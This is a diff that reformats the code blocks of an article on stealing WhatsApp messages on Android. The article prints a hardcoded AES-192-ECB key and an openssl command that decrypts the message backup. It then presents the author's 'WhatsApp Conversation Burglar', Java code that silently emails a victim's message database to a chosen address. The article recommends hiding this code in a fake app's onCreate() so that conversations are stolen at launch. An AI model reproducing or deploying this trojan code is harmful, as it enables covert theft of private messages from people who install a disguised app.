@@ -23,7 +23,9 @@ The last unassailable bastion was the local database of messages, since it was p
 Summarizing: The database containing all the WhatsApp messages is stored in a SQLite file format. For iOS phones, this file is in the path: [App ID] / Documents / ChatStorage.sqlite, and in the case of Android phones, at / com.whatsapp / databases / msgstore.db. This file is unencrypted, and this requires the phone to be jailbroken. In Android, the backup file is stored in the external memory card and was also not encrypted. This changed in one application update, and now, if the phone is lost or stolen, the messages cannot be read.
 
 Unfortunately, the application uses the same key for the encryption (AES-192-ECB) (346a23652a46392b4d73257c67317e352e3372482177652c), and there is no use of entropy or unique factors for each device, so the database can be unencrypted within a matter of seconds.
-<pre lang="java">openssl enc -d  -aes-192-ecb -in msgstore-1.db.crypt -out msgstore.db.sqlite -K346a23652a46392b4d73257c67317e352e3372482177652c</pre>
+```bash
+openssl enc -d  -aes-192-ecb -in msgstore-1.db.crypt -out msgstore.db.sqlite -K346a23652a46392b4d73257c67317e352e3372482177652c
+```
 &nbsp;
 
 So, we know how to break the encryption. Now we have to solve the problem of having access to the device.
@@ -37,9 +39,10 @@ I have developed a framework (WhatsApp Conversation Burglar) that can be include
 Let's see how it works:
 
 The framework presents a dummy Activity (MailSenderActivity), with only a button. We have the following listener when the button is clicked:
-<pre lang="java"> public void onClick(View v) {
+```java
+ public void onClick(View v) {
             	try {   
-                	AsyncTask&lt;Void, Void, Void&gt; m = new AsyncTask&lt;Void, Void, Void&gt;() {
+                	AsyncTask<Void, Void, Void> m = new AsyncTask<Void, Void, Void>() {
 
 						@Override
 						protected Void doInBackground(Void... arg0) {
@@ -61,7 +64,8 @@ The framework presents a dummy Activity (MailSenderActivity), with only a button
                     DebugLog.e("SendMail", e.getMessage());   
                 } 
             }
-        });</pre>
+        });
+```
 This section of code initializes a GMailSender object with some parameters. The function _addAttachment()_ attaches a target file to be sent (in our case, it is the database containing all the WhatsApp messages) and a subject to the email. The function _sendMail()_ just sends the email with the required information (SUBJECT_STRING, BODY_STRING, EMAIL_STRING, RECIPIENT_STRING). The class GMailSender is the object responsible for all the email communication, using the JavaMail library. The code is self-explanatory.
 
 By setting the right parameters, the file with all the conversations is sent to the provided email address, where we can decrypt it by using the line I provided earlier in the terminal. If you want to use this framework in your application, you only have to add it as a library and include the code within the application (probably in the onCreate() method of the first activity triggered, so you make sure the conversations are stolen when the application starts). A fake application could include this framework and steal all the conversations from the users installing it
